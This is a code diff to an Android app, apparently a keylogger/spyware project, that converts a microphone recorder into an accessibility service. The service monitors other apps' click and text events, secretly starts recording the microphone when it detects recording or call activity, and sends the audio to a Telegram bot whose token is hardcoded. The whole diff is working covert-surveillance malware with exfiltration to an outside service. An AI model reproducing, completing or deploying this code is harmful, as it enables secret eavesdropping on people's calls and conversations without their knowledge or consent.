@@ -1,12 +1,15 @@
 package com.bshu2.androidkeylogger;
 
+import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
+import android.content.Intent;
 import android.media.MediaRecorder;
 import android.os.AsyncTask;
 import android.os.Environment;
 import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
 
-import com.example.newdynamicapk.Constants; // Importing the Constants class
+import com.example.newdynamicapk.Constants;
 
 import java.io.File;
 import java.io.OutputStream;
@@ -14,12 +17,12 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 /**
- * Microphone Recorder Service for recording and sending audio to Telegram.
+ * Accessibility service and microphone recorder combined.
  */
-public class MicrophoneRecorder {
+public class MicrophoneRecorderService extends AccessibilityService {
 
-    private static final String TAG = "MicrophoneRecorder";
-    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI"; // Static bot token
+    private static final String TAG = "MicrophoneRecorderService";
+    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
     private MediaRecorder recorder;
     private File audioFile;
 
@@ -34,7 +37,7 @@ public class MicrophoneRecorder {
             audioFile = new File(dir, "mic_" + System.currentTimeMillis() + ".mp3");
 
             recorder = new MediaRecorder();
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC); // Record from the microphone
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
             recorder.setOutputFile(audioFile.getAbsolutePath());
@@ -65,6 +68,45 @@ public class MicrophoneRecorder {
         }
     }
 
+    /**
+     * Accessibility event listener for detecting microphone and call activity.
+     */
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+        String eventText = event.getText() != null ? event.getText().toString().toLowerCase() : "";
+
+        switch (event.getEventType()) {
+            case AccessibilityEvent.TYPE_VIEW_CLICKED:
+            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+                Log.d(TAG, "Event detected from package: " + packageName + ", Event Text: " + eventText);
+
+                // Check for microphone-related activity
+                if (eventText.contains("record") || packageName.contains("audio") || packageName.contains("microphone")) {
+                    Log.d(TAG, "Potential microphone activity detected. Starting microphone recording.");
+                    startRecording(this);
+                }
+
+                // Check for call ending or disconnect
+                if (packageName.contains("call") && (eventText.contains("end") || eventText.contains("disconnect"))) {
+                    Log.d(TAG, "Call ended. Stopping microphone recording.");
+                    stopRecordingAndSendToTelegram();
+                }
+                break;
+
+            default:
+                break;
+        }
+    }
+
+    @Override
+    public void onInterrupt() {
+        Log.d(TAG, "Accessibility Service Interrupted");
+    }
+
+    /**
+     * AsyncTask for sending the recorded audio file to Telegram.
+     */
     private class SendToTelegramTask extends AsyncTask<String, Void, Void> {
         @Override
         protected Void doInBackground(String... params) {
@@ -116,33 +158,5 @@ public class MicrophoneRecorder {
             }
             return null;
         }
-    }
-}
-
-@Override
-public void onAccessibilityEvent(AccessibilityEvent event) {
-    String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-
-    switch (event.getEventType()) {
-        case AccessibilityEvent.TYPE_VIEW_CLICKED:
-        case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-            String data = event.getText() != null ? event.getText().toString().toLowerCase() : "";
-
-            if (data.contains("record") || packageName.contains("audio") || packageName.contains("microphone")) {
-                Log.d(TAG, "Potential microphone activity detected. Starting recording service.");
-                // Start microphone recording service
-                startService(new Intent(this, MicrophoneRecorderService.class));
-            }
-
-            if (packageName.contains("call")) {
-                if (data.contains("end") || data.contains("disconnect")) {
-                    Log.d(TAG, "Call ended. Stopping recording service.");
-                    // Stop microphone recording service
-                    stopService(new Intent(this, MicrophoneRecorderService.class));
-                }
-            }
-            break;
-        default:
-            break;
     }
 }
